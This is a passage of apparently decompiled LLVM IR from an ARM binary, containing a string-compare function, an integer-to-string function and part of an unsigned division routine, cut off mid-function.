  %storemerge = phi i32 [ %v2_11d60, %dec_label_pc_11d60 ], [ -1, %dec_label_pc_11d14 ], [ -1, %dec_label_pc_11d1c.backedge ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_11d54, { 1, 0 }
  uselistorder i32 %v0_11d28, { 1, 0 }
  uselistorder i32 %v1_11d34, { 1, 0 }
  uselistorder i32 %tmp23, { 1, 0 }
  uselistorder i32 26, { 0, 1, 2, 7, 6, 8, 3, 9, 4, 10, 5, 11, 12 }
  uselistorder label %dec_label_pc_11d6c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11d1c.backedge, { 1, 0 }
  uselistorder label %bb33, { 1, 0 }
  uselistorder label %bb31, { 1, 0 }
  uselistorder label %dec_label_pc_11d28, { 1, 0 }
}

define i32 @util_strcmp(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v2_11d74 = load i8, i8* %arg1, align 1
  %v2_11d78 = icmp eq i8 %v2_11d74, 0
  br i1 %v2_11d78, label %bb, label %dec_label_pc_11d84

bb:                                               ; preds = %entry
  %v3_11d74 = zext i8 %v2_11d74 to i32
  br label %dec_label_pc_11d98

dec_label_pc_11d84:                               ; preds = %entry
  br label %dec_label_pc_11d88

dec_label_pc_11d88:                               ; preds = %dec_label_pc_11d88, %dec_label_pc_11d84
  %v0_11d88 = phi i32 [ %v1_11d88, %dec_label_pc_11d88 ], [ 0, %dec_label_pc_11d84 ]
  %v1_11d88 = add i32 %v0_11d88, 1
  %v2_11d8c = add i32 %v1_11d88, %tmp
  %v3_11d8c = inttoptr i32 %v2_11d8c to i8*
  %v4_11d8c = load i8, i8* %v3_11d8c, align 1
  %v2_11d90 = icmp eq i8 %v4_11d8c, 0
  br i1 %v2_11d90, label %dec_label_pc_11d98, label %dec_label_pc_11d88

dec_label_pc_11d98:                               ; preds = %dec_label_pc_11d88, %bb
  %v0_11de43 = phi i32 [ %v3_11d74, %bb ], [ %v1_11d88, %dec_label_pc_11d88 ]
  %v1_11d98 = inttoptr i32 %arg2 to i8*
  %v2_11d98 = load i8, i8* %v1_11d98, align 1
  %v3_11d98 = zext i8 %v2_11d98 to i32
  store i32 %v3_11d98, i32* @r3, align 4
  %v2_11d9c = icmp eq i8 %v2_11d98, 0
  br i1 %v2_11d9c, label %bb21, label %dec_label_pc_11da8

bb21:                                             ; preds = %dec_label_pc_11d98
  store i32 %v3_11d98, i32* @r2, align 4
  br label %dec_label_pc_11dbc

dec_label_pc_11da8:                               ; preds = %dec_label_pc_11d98
  br label %dec_label_pc_11dac

dec_label_pc_11dac:                               ; preds = %dec_label_pc_11dac, %dec_label_pc_11da8
  %v0_11dac = phi i32 [ %v1_11dac, %dec_label_pc_11dac ], [ 0, %dec_label_pc_11da8 ]
  %v1_11dac = add i32 %v0_11dac, 1
  store i32 %v1_11dac, i32* @r2, align 4
  %v2_11db0 = add i32 %v1_11dac, %arg2
  %v3_11db0 = inttoptr i32 %v2_11db0 to i8*
  %v4_11db0 = load i8, i8* %v3_11db0, align 1
  %v6_11db0 = zext i8 %v4_11db0 to i32
  store i32 %v6_11db0, i32* @r3, align 4
  %v2_11db4 = icmp eq i8 %v4_11db0, 0
  br i1 %v2_11db4, label %dec_label_pc_11dbc, label %dec_label_pc_11dac

dec_label_pc_11dbc:                               ; preds = %dec_label_pc_11dac, %bb21
  %v0_11dbc = phi i32 [ %v3_11d98, %bb21 ], [ %v1_11dac, %dec_label_pc_11dac ]
  %v9_11dbc = icmp eq i32 %v0_11dbc, %v0_11de43
  br i1 %v9_11dbc, label %dec_label_pc_11de4.preheader, label %dec_label_pc_11dc4

dec_label_pc_11de4.preheader:                     ; preds = %dec_label_pc_11dbc
  %v2_11de45 = icmp eq i32 %v0_11de43, 0
  br i1 %v2_11de45, label %dec_label_pc_11dec, label %dec_label_pc_11dcc

dec_label_pc_11dc4:                               ; preds = %dec_label_pc_11dcc, %dec_label_pc_11dbc
  ret i32 0

dec_label_pc_11dcc:                               ; preds = %dec_label_pc_11ddc, %dec_label_pc_11de4.preheader
  %v0_11de4.in = phi i32 [ %v0_11de4, %dec_label_pc_11ddc ], [ %v0_11de43, %dec_label_pc_11de4.preheader ]
  %v0_11de0 = phi i32 [ %v1_11de0, %dec_label_pc_11ddc ], [ %arg2, %dec_label_pc_11de4.preheader ]
  %v0_11ddc = phi i32 [ %v1_11ddc, %dec_label_pc_11ddc ], [ %tmp, %dec_label_pc_11de4.preheader ]
  %v0_11de4 = add i32 %v0_11de4.in, -1
  %v1_11dcc = inttoptr i32 %v0_11ddc to i8*
  %v2_11dcc = load i8, i8* %v1_11dcc, align 1
  %v3_11dcc = zext i8 %v2_11dcc to i32
  store i32 %v3_11dcc, i32* @r2, align 4
  %v1_11dd0 = inttoptr i32 %v0_11de0 to i8*
  %v2_11dd0 = load i8, i8* %v1_11dd0, align 1
  %v3_11dd0 = zext i8 %v2_11dd0 to i32
  store i32 %v3_11dd0, i32* @r3, align 4
  %v9_11dd4 = icmp eq i8 %v2_11dcc, %v2_11dd0
  br i1 %v9_11dd4, label %dec_label_pc_11ddc, label %dec_label_pc_11dc4

dec_label_pc_11ddc:                               ; preds = %dec_label_pc_11dcc
  %v1_11ddc = add i32 %v0_11ddc, 1
  %v1_11de0 = add i32 %v0_11de0, 1
  %v2_11de4 = icmp eq i32 %v0_11de4, 0
  br i1 %v2_11de4, label %dec_label_pc_11dec, label %dec_label_pc_11dcc

dec_label_pc_11dec:                               ; preds = %dec_label_pc_11ddc, %dec_label_pc_11de4.preheader
  ret i32 1

; uselistorder directives
  uselistorder i32 %v1_11dac, { 0, 1, 3, 2 }
  uselistorder i8 %v2_11d74, { 1, 0 }
}

define i32 @util_itoa(i8 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = sext i8 %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-66 = alloca i32, align 4
  %v0_11df8 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_11df8, i32* %r8.global-to-local, align 4
  %v2_11df8 = icmp eq i32 %v0_11df8, 0
  store i1 %v2_11df8, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg2, i32* %r6.global-to-local, align 4
  br i1 %v2_11df8, label %dec_label_pc_11ed8, label %dec_label_pc_11e08

dec_label_pc_11e08:                               ; preds = %entry
  %v3_11e08 = icmp eq i8 %arg1, 0
  store i1 %v3_11e08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_11e08, label %.thread, label %dec_label_pc_11e1c

.thread:                                          ; preds = %dec_label_pc_11e08
  %v4_11e10 = inttoptr i32 %v0_11df8 to i8*
  store i8 48, i8* %v4_11e10, align 1
  %v0_11e14.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_11e14.pr.pr, label %.thread1, label %dec_label_pc_11e1c

.thread1:                                         ; preds = %.thread
  %v4_11e14 = load i32, i32* %r8.global-to-local, align 4
  %v5_11e14 = add i32 %v4_11e14, 1
  %v6_11e14 = inttoptr i32 %v5_11e14 to i8*
  store i8 0, i8* %v6_11e14, align 1
  %v0_11e18.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_11e18.pr.pr, label %dec_label_pc_11ed8, label %dec_label_pc_11e1c

dec_label_pc_11e1c:                               ; preds = %dec_label_pc_11e08, %.thread, %.thread1
  %tmp48 = icmp slt i8 %arg1, 0
  %v7_11e20 = icmp eq i32 %arg2, 10
  store i1 %v7_11e20, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11e20, label %bb, label %.thread29

.thread29:                                        ; preds = %dec_label_pc_11e1c
  store i32 0, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %.thread6

bb:                                               ; preds = %dec_label_pc_11e1c
  %v4_11e1c = zext i1 %tmp48 to i32
  store i32 %v4_11e1c, i32* %r2.global-to-local, align 4
  %phitmp = icmp eq i1 %tmp48, false
  store i1 %phitmp, i1* %cpsr_z.global-to-local, align 1
  %v3_11e408 = sub nsw i32 0, %tmp
  %tmp.v3_11e408 = select i1 %phitmp, i32 %tmp, i32 %v3_11e408
  %tmp47 = zext i1 %phitmp to i32
  %. = xor i32 %tmp47, 1
  br label %.thread6

.thread6:                                         ; preds = %bb, %.thread29
  %storemerge31 = phi i32 [ %tmp, %.thread29 ], [ %tmp.v3_11e408, %bb ]
  %storemerge = phi i32 [ 0, %.thread29 ], [ %., %bb ]
  store i32 %storemerge, i32* %sl.global-to-local, align 4
  store i32 32, i32* %r5.global-to-local, align 4
  %v2_11e4c = ptrtoint i32* %stack_var_-66 to i32
  store i32 %v2_11e4c, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_11e50

dec_label_pc_11e50:                               ; preds = %bb46, %.thread6
  %v2_11e70 = phi i32 [ %v1_11e7c, %bb46 ], [ 32, %.thread6 ]
  %v0_11e64 = phi i32 [ %v2_11e74, %bb46 ], [ %storemerge31, %.thread6 ]
  %v0_11e54 = load i32, i32* %r6.global-to-local, align 4
  %v3_11e58 = urem i32 %v0_11e64, %v0_11e54
  store i32 %v3_11e58, i32* %r1.global-to-local, align 4
  %v7_11e5c = icmp eq i32 %v3_11e58, 9
  store i1 %v7_11e5c, i1* %cpsr_z.global-to-local, align 1
  %v1_11e60 = add i32 %v3_11e58, 48
  store i32 %v0_11e64, i32* %r0.global-to-local, align 4
  %v7_11e68 = icmp sgt i32 %v3_11e58, 9
  %extract.t = trunc i32 %v1_11e60 to i8
  br i1 %v7_11e68, label %bb45, label %bb46

bb45:                                             ; preds = %dec_label_pc_11e50
  %v9_11e68 = add i32 %v3_11e58, 55
  %extract.t28 = trunc i32 %v9_11e68 to i8
  br label %bb46

bb46:                                             ; preds = %dec_label_pc_11e50, %bb45
  %v0_11e70.off0 = phi i8 [ %extract.t, %dec_label_pc_11e50 ], [ %extract.t28, %bb45 ]
  store i32 %v0_11e54, i32* %r1.global-to-local, align 4
  %v3_11e70 = load i32, i32* %r7.global-to-local, align 4
  %v4_11e70 = add i32 %v3_11e70, %v2_11e70
  %v5_11e70 = inttoptr i32 %v4_11e70 to i8*
  store i8 %v0_11e70.off0, i8* %v5_11e70, align 1
  %v0_11e74 = load i32, i32* %r0.global-to-local, align 4
  %v1_11e74 = load i32, i32* %r1.global-to-local, align 4
  %v2_11e74 = udiv i32 %v0_11e74, %v1_11e74
  store i32 %v2_11e74, i32* %r0.global-to-local, align 4
  %v2_11e78 = icmp ugt i32 %v1_11e74, %v0_11e74
  store i1 %v2_11e78, i1* %cpsr_z.global-to-local, align 1
  %v0_11e7c = load i32, i32* %r5.global-to-local, align 4
  %v1_11e7c = add i32 %v0_11e7c, -1
  store i32 %v1_11e7c, i32* %r5.global-to-local, align 4
  br i1 %v2_11e78, label %dec_label_pc_11e84, label %dec_label_pc_11e50

dec_label_pc_11e84:                               ; preds = %bb46
  %v0_11e84 = load i32, i32* %sl.global-to-local, align 4
  %v2_11e84 = icmp eq i32 %v0_11e84, 0
  store i1 %v2_11e84, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11e84, label %.thread12, label %.thread11

.thread11:                                        ; preds = %dec_label_pc_11e84
  %v3_11e88 = ptrtoint i32* %stack_var_-32 to i32
  %v3_11e8c = add i32 %v1_11e7c, %v3_11e88
  store i32 %v3_11e8c, i32* %r2.global-to-local, align 4
  %v4_11e94 = add i32 %v3_11e8c, -34
  %v5_11e94 = inttoptr i32 %v4_11e94 to i8*
  store i8 45, i8* %v5_11e94, align 1
  %v0_11e98.pr.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_11e98.pre = load i32, i32* %r5.global-to-local, align 4
  br i1 %v0_11e98.pr.pr.pr, label %.thread12, label %.thread11._crit_edge

.thread12:                                        ; preds = %.thread11, %dec_label_pc_11e84
  %v1_11e98 = phi i32 [ %v1_11e7c, %dec_label_pc_11e84 ], [ %v1_11e98.pre, %.thread11 ]
  %v2_11e98 = add i32 %v1_11e98, 1
  store i32 %v2_11e98, i32* %r5.global-to-local, align 4
  br label %.thread11._crit_edge

.thread11._crit_edge:                             ; preds = %.thread11, %.thread12
  %v1_11ea4 = phi i32 [ %v2_11e98, %.thread12 ], [ %v1_11e98.pre, %.thread11 ]
  %v0_11e9c = load i32, i32* %r7.global-to-local, align 4
  %v2_11e9c = add i32 %v0_11e9c, %v1_11ea4
  %v3_11e9c = inttoptr i32 %v2_11e9c to i8*
  %v4_11e9c = load i8, i8* %v3_11e9c, align 1
  %v6_11e9c = zext i8 %v4_11e9c to i32
  %v2_11ea0 = icmp eq i8 %v4_11e9c, 0
  store i1 %v2_11ea0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_11e9c, i32* %r2.global-to-local, align 4
  br i1 %v2_11ea0, label %dec_label_pc_11ee8, label %dec_label_pc_11eb0.preheader

dec_label_pc_11eb0.preheader:                     ; preds = %.thread11._crit_edge
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_11eb0

dec_label_pc_11eb0:                               ; preds = %dec_label_pc_11eb0.preheader, %dec_label_pc_11eb0
  %v0_11eb0 = phi i32 [ 0, %dec_label_pc_11eb0.preheader ], [ %v1_11eb0, %dec_label_pc_11eb0 ]
  %v1_11eb0 = add i32 %v0_11eb0, 1
  store i32 %v1_11eb0, i32* %r1.global-to-local, align 4
  %v2_11eb4 = add i32 %v1_11eb0, %v2_11e9c
  %v3_11eb4 = inttoptr i32 %v2_11eb4 to i8*
  %v4_11eb4 = load i8, i8* %v3_11eb4, align 1
  %v2_11eb8 = icmp eq i8 %v4_11eb4, 0
  store i1 %v2_11eb8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11eb8, label %dec_label_pc_11ec0, label %dec_label_pc_11eb0

dec_label_pc_11ec0:                               ; preds = %dec_label_pc_11eb0, %dec_label_pc_11ee8
  %v0_11ec425 = phi i32 [ %v6_11e9c, %dec_label_pc_11ee8 ], [ %v1_11eb0, %dec_label_pc_11eb0 ]
  %v0_11ec0 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_11ec0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11ec4

dec_label_pc_11ec4:                               ; preds = %dec_label_pc_11ec4.dec_label_pc_11ec4_crit_edge, %dec_label_pc_11ec0
  %v2_11ed0 = phi i32 [ %v5_11ed0, %dec_label_pc_11ec4.dec_label_pc_11ec4_crit_edge ], [ %v0_11ec0, %dec_label_pc_11ec0 ]
  %v0_11ec8 = phi i32 [ %v0_11ec8.pre, %dec_label_pc_11ec4.dec_label_pc_11ec4_crit_edge ], [ %v2_11e9c, %dec_label_pc_11ec0 ]
  %v0_11ec4 = phi i32 [ %v0_11ec4.pre, %dec_label_pc_11ec4.dec_label_pc_11ec4_crit_edge ], [ %v0_11ec425, %dec_label_pc_11ec0 ]
  %v1_11ec4 = add i32 %v0_11ec4, -1
  store i32 %v1_11ec4, i32* %r1.global-to-local, align 4
  %v1_11ec8 = inttoptr i32 %v0_11ec8 to i8*
  %v2_11ec8 = load i8, i8* %v1_11ec8, align 1
  %v5_11ec8 = add i32 %v0_11ec8, 1
  store i32 %v5_11ec8, i32* %r2.global-to-local, align 4
  %v3_11ecc = icmp eq i32 %v0_11ec4, 0
  store i1 %v3_11ecc, i1* %cpsr_z.global-to-local, align 1
  %v3_11ed0 = inttoptr i32 %v2_11ed0 to i8*
  store i8 %v2_11ec8, i8* %v3_11ed0, align 1
  %v4_11ed0 = load i32, i32* %r0.global-to-local, align 4
  %v5_11ed0 = add i32 %v4_11ed0, 1
  store i32 %v5_11ed0, i32* %r0.global-to-local, align 4
  br i1 %v3_11ecc, label %dec_label_pc_11ed8, label %dec_label_pc_11ec4.dec_label_pc_11ec4_crit_edge

dec_label_pc_11ec4.dec_label_pc_11ec4_crit_edge:  ; preds = %dec_label_pc_11ec4
  %v0_11ec4.pre = load i32, i32* %r1.global-to-local, align 4
  %v0_11ec8.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_11ec4

dec_label_pc_11ed8:                               ; preds = %dec_label_pc_11ec4, %.thread1, %entry
  %v0_11ed8 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_11ed8, i32* %r0.global-to-local, align 4
  ret i32 %v0_11ed8

dec_label_pc_11ee8:                               ; preds = %.thread11._crit_edge
  store i32 %v6_11e9c, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_11ec0

; uselistorder directives
  uselistorder i32 %v5_11ed0, { 1, 0 }
  uselistorder i1 %v3_11ecc, { 1, 0 }
  uselistorder i32 %v0_11ec8, { 1, 0 }
  uselistorder i32 %v1_11eb0, { 0, 1, 3, 2 }
  uselistorder i32 %v6_11e9c, { 1, 0 }
  uselistorder i32 %v2_11e9c, { 1, 0, 2, 3 }
  uselistorder i32 %v1_11e98.pre, { 1, 0 }
  uselistorder i32 %v1_11e7c, { 1, 0, 3, 2 }
  uselistorder i32 %v2_11e74, { 1, 0 }
  uselistorder i32 %v3_11e58, { 0, 2, 1, 3, 4 }
  uselistorder i1 %phitmp, { 2, 1, 0 }
  uselistorder i32 %v0_11df8, { 0, 2, 1 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 4, 5, 6, 7, 0, 1 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 1, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 1, 6, 7, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 13, 8, 10, 9, 11, 12 }
  uselistorder i32 55, { 7, 0, 3, 4, 2, 5, 6, 1 }
  uselistorder label %dec_label_pc_11ec0, { 1, 0 }
  uselistorder label %dec_label_pc_11eb0, { 1, 0 }
  uselistorder label %.thread11._crit_edge, { 1, 0 }
  uselistorder label %bb46, { 1, 0 }
  uselistorder label %dec_label_pc_11e1c, { 2, 1, 0 }
}

define i32 @__udivsi3(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_11ef0 = load i32, i32* @r1, align 4
  %v1_11ef0 = add i32 %v0_11ef0, -1
  store i32 %v1_11ef0, i32* %r2.global-to-local, align 4
  %v2_11ef0 = icmp eq i32 %v0_11ef0, 0
  %v7_11ef0 = icmp eq i32 %v0_11ef0, 1
  %v0_11ef4 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v7_11ef0, i32 %v0_11ef4)
  br i1 %v2_11ef0, label %dec_label_pc_11fd8, label %dec_label_pc_11efc

dec_label_pc_11efc:                               ; preds = %entry
  %v0_11efc = load i32, i32* %r0.global-to-local, align 4
  %v1_11efc = load i32, i32* @r1, align 4
  %tmp = icmp ugt i32 %v0_11efc, %v1_11efc
  br i1 %tmp, label %dec_label_pc_11f04, label %dec_label_pc_11f90

dec_label_pc_11f04:                               ; preds = %dec_label_pc_11efc
  %v1_11f04 = load i32, i32* %r2.global-to-local, align 4
  %v2_11f04 = and i32 %v1_11f04, %v1_11efc
  %v4_11f04 = icmp eq i32 %v2_11f04, 0
  br i1 %v4_11f04, label %dec_label_pc_11f9c, label %dec_label_pc_11f0c

dec_label_pc_11f0c:                               ; preds = %dec_label_pc_11f04
  %v3_11f0c = icmp ult i32 %v1_11efc, 536870912
  br i1 %v3_11f0c, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_11f0c
  %v4_11f10 = mul i32 %v1_11efc, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_11f0c, %.thread
  %v0_11f30.pr36.ph = phi i32 [ %v4_11f10, %.thread ], [ %v1_11efc, %dec_label_pc_11f0c ]
  %storemerge133 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_11f0c ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb81
  %v0_11f30.pr36 = phi i32 [ %v4_11f24, %bb81 ], [ %v0_11f30.pr36.ph, %.preheader.preheader ]
  %v1_11f28 = phi i32 [ %v4_11f28, %bb81 ], [ %storemerge133, %.preheader.preheader ]
  %v2_11f1c = icmp ugt i32 %v0_11f30.pr36, 268435455
  br i1 %v2_11f1c, label %.thread2, label %bb

.thread2:                                         ; preds = %.preheader
  br label %dec_label_pc_11f30thread-pre-split.loopexit

bb:                                               ; preds = %.preheader
  %v4_11f20 = icmp ult i32 %v0_11f30.pr36, %v0_11efc
  br i1 %v4_11f20, label %bb80, label %dec_label_pc_11f30thread-pre-split.loopexit.loopexit

bb80:                                             ; preds = %bb
  %v2_11f24 = and i32 %v0_11f30.pr36, 268435456
  %v3_11f24 = icmp eq i32 %v2_11f24, 0
  %v4_11f24 = mul i32 %v0_11f30.pr36, 16
  br i1 %v3_11f24, label %bb81, label %dec_label_pc_11f30.loopexit

bb81:                                             ; preds = %bb80
  %v2_11f28 = and i32 %v1_11f28, 268435456
  %v3_11f28 = icmp eq i32 %v2_11f28, 0
  %v4_11f28 = mul i32 %v1_11f28, 16
  br i1 %v3_11f28, label %.preheader, label %dec_label_pc_11f30thread-pre-split.loopexit.loopexit

dec_label_pc_11f30thread-pre-split.loopexit.loopexit: ; preds = %bb81, %bb
  %v1_11f3c48.ph = phi i32 [ %v1_11f28, %bb ], [ %v4_11f28, %bb81 ]
  %v0_11f30.pr38.ph = phi i32 [ %v0_11f30.pr36, %bb ], [ %v4_11f24, %bb81 ]
  br label %dec_label_pc_11f30thread-pre-split.loopexit

dec_label_pc_11f30thread-pre-split.loopexit:      ; preds = %dec_label_pc_11f30thread-pre-split.loopexit.loopexit, %.thread2
  %v1_11f3c48 = phi i32 [ %v1_11f28, %.thread2 ], [ %v1_11f3c48.ph, %dec_label_pc_11f30thread-pre-split.loopexit.loopexit ]
  %v0_11f30.pr38 = phi i32 [ %v0_11f30.pr36, %.thread2 ], [ %v0_11f30.pr38.ph, %dec_label_pc_11f30thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_11f30thread-pre-split

dec_label_pc_11f30thread-pre-split:               ; preds = %dec_label_pc_11f30thread-pre-split.loopexit, %bb83
  %v1_11f3c46 = phi i32 [ %v1_11f3c48, %dec_label_pc_11f30thread-pre-split.loopexit ], [ %v3_11f3c, %bb83 ]
  %v0_11f30.pr = phi i32 [ %v0_11f30.pr38, %dec_label_pc_11f30thread-pre-split.loopexit ], [ %v3_11f38, %bb83 ]
  br label %dec_label_pc_11f30

dec_label_pc_11f30.loopexit:                      ; preds = %bb80
  br label %dec_label_pc_11f30

dec_label_pc_11f30:                               ; preds = %dec_label_pc_11f30.loopexit, %dec_label_pc_11f30thread-pre-split
  %v1_11f3c = phi i32 [ %v1_11f3c46, %dec_label_pc_11f30thread-pre-split ], [ %v1_11f28, %dec_label_pc_11f30.loopexit ]
  %v1_11f38 = phi i32 [ %v0_11f30.pr, %dec_label_pc_11f30thread-pre-split ], [ %v4_11f24, %dec_label_pc_11f30.loopexit ]
  %v2_11f30 = icmp slt i32 %v1_11f38, 0
  br i1 %v2_11f30, label %dec_label_pc_11f44, label %bb82

bb82:                                             ; preds = %dec_label_pc_11f30
  %v4_11f34 = icmp ult i32 %v1_11f38, %v0_11efc
  br i1 %v4_11f34, label %bb83, label %dec_label_pc_11f44

bb83:                                             ; preds = %bb82
  %v3_11f38 = mul i32 %v1_11f38, 2
  %v2_11f3c = icmp slt i32 %v1_11f3c, 0
  %v3_11f3c = mul i32 %v1_11f3c, 2
  br i1 %v2_11f3c, label %dec_label_pc_11f44, label %dec_label_pc_11f30thread-pre-split

dec_label_pc_11f44:                               ; preds = %bb82, %dec_label_pc_11f30, %bb83
  %v2_11f5059 = phi i32 [ %v3_11f3c, %bb83 ], [ %v1_11f3c, %bb82 ], [ %v1_11f3c, %dec_label_pc_11f30 ]
  %v1_11f4851 = phi i32 [ %v3_11f38, %bb83 ], [ %v1_11f38, %bb82 ], [ %v1_11f38, %dec_label_pc_11f30 ]
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_11f48

dec_label_pc_11f48:                               ; preds = %.thread11, %dec_label_pc_11f44
  %v1_11f7c = phi i32 [ %v4_11f7c, %.thread11 ], [ %v2_11f5059, %dec_label_pc_11f44 ]
  %v1_11f50 = phi i32 [ %v0_11f88, %.thread11 ], [ 0, %dec_label_pc_11f44 ]
  %v1_11f80 = phi i32 [ %v4_11f80, %.thread11 ], [ %v1_11f4851, %dec_label_pc_11f44 ]
  %v1_11f4c = phi i32 [ %v0_11f78, %.thread11 ], [ %v0_11efc, %dec_label_pc_11f44 ]
  %v3_11f48 = icmp ult i32 %v1_11f4c, %v1_11f80
  br i1 %v3_11f48, label %.thread7, label %bb84

bb84:                                             ; preds = %dec_label_pc_11f48
  %v3_11f4c = sub i32 %v1_11f4c, %v1_11f80
  store i32 %v3_11f4c, i32* %r0.global-to-local, align 4
  %v3_11f50 = or i32 %v1_11f50, %v1_11f7c
  store i32 %v3_11f50, i32* %r2.global-to-local, align 4
  br label %.thread7

.thread7:                                         ; preds = %dec_label_pc_11f48, %bb84
  %v1_11f58 = phi i32 [ %v1_11f4c, %dec_label_pc_11f48 ], [ %v3_11f4c, %bb84 ]
  %v1_11f5c = phi i32 [ %v1_11f50, %dec_label_pc_11f48 ], [ %v3_11f50, %bb84 ]
  %v4_11f54 = udiv i32 %v1_11f80, 2
  %v6_11f54 = icmp ult i32 %v1_11f58, %v4_11f54
  br i1 %v6_11f54, label %.thread8, label %bb85

bb85:                                             ; preds = %.thread7
  %v3_11f58 = urem i32 %v1_11f80, 2
  %v4_11f58 = icmp eq i32 %v3_11f58, 0
  %v6_11f58 = sub i32 %v1_11f58, %v4_11f54
  store i32 %v6_11f58, i32* %r0.global-to-local, align 4
  br i1 %v4_11f58, label %.thread8, label %bb86

bb86:                                             ; preds = %bb85
  %v5_11f5c = udiv i32 %v1_11f7c, 2
  %v6_11f5c = or i32 %v1_11f5c, %v5_11f5c
  store i32 %v6_11f5c, i32* %r2.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %bb85, %.thread7, %bb86
  %v1_11f64 = phi i32 [ %v6_11f58, %bb85 ], [ %v1_11f58, %.thread7 ], [ %v6_11f58, %bb86 ]
  %v1_11f68 = phi i32 [ %v1_11f5c, %bb85 ], [ %v1_11f5c, %.thread7 ], [ %v6_11f5c, %bb86 ]
  %v4_11f60 = udiv i32 %v1_11f80, 4
  %v6_11f60 = icmp ult i32 %v1_11f64, %v4_11f60
  br i1 %v6_11f60, label %.thread9, label %bb87

bb87:                                             ; preds = %.thread8
  %v3_11f64 = and i32 %v1_11f80, 2
  %v4_11f64 = icmp eq i32 %v3_11f64, 0
  %v6_11f64 = sub i32 %v1_11f64, %v4_11f60
  store i32 %v6_11f64, i32* %r0.global-to-local, align 4
  br i1 %v4_11f64, label %.thread9, label %bb88

bb88:                                             ; preds = %bb87
  %v5_11f68 = udiv i32 %v1_11f7c, 4
  %v6_11f68 = or i32 %v1_11f68, %v5_11f68
  store i32 %v6_11f68, i32* %r2.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %bb87, %.thread8, %bb88
  %v1_11f70 = phi i32 [ %v6_11f64, %bb87 ], [ %v1_11f64, %.thread8 ], [ %v6_11f64, %bb88 ]
  %v1_11f74 = phi i32 [ %v1_11f68, %bb87 ], [ %v1_11f68, %.thread8 ], [ %v6_11f68, %bb88 ]
  %v4_11f6c = udiv i32 %v1_11f80, 8
  %v6_11f6c = icmp ult i32 %v1_11f70, %v4_11f6c
  br i1 %v6_11f6c, label %thread-pre-split, label %bb89

bb89:                                             ; preds = %.thread9
  %v3_11f70 = and i32 %v1_11f80, 4
  %v4_11f70 = icmp eq i32 %v3_11f70, 0
  %v6_11f70 = sub i32 %v1_11f70, %v4_11f6c
  store i32 %v6_11f70, i32* %r0.global-to-local, align 4
  br i1 %v4_11f70, label %thread-pre-split, label %bb90

bb90:                                             ; preds = %bb89
  %v5_11f74 = udiv i32 %v1_11f7c, 8
  %v6_11f74 = or i32 %v1_11f74, %v5_11f74
  store i32 %v6_11f74, i32* %r2.global-to-local, align 4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb90, %.thread9, %bb89
  %v0_11f88 = phi i32 [ %v1_11f74, %bb89 ], [ %v1_11f74, %.thread9 ], [ %v6_11f74, %bb90 ]
  %v0_11f78 = phi i32 [ %v6_11f70, %bb89 ], [ %v1_11f70, %.thread9 ], [ %v6_11f70, %bb90 ]
  %v2_11f78 = icmp eq i32 %v0_11f78, 0
  br i1 %v2_11f78, label %dec_label_pc_11f88, label %bb91

bb91:                                             ; preds = %thread-pre-split
  %tmp138 = icmp ult i32 %v1_11f7c, 16
  br i1 %tmp138, label %dec_label_pc_11f88, label %.thread11

.thread11:                                        ; preds = %bb91
  %v4_11f7c = udiv i32 %v1_11f7c, 16
  %v4_11f80 = udiv i32 %v1_11f80, 16
  br label %dec_label_pc_11f48

dec_label_pc_11f88:                               ; preds = %thread-pre-split, %bb91
  store i32 %v0_11f88, i32* %r0.global-to-local, align 4
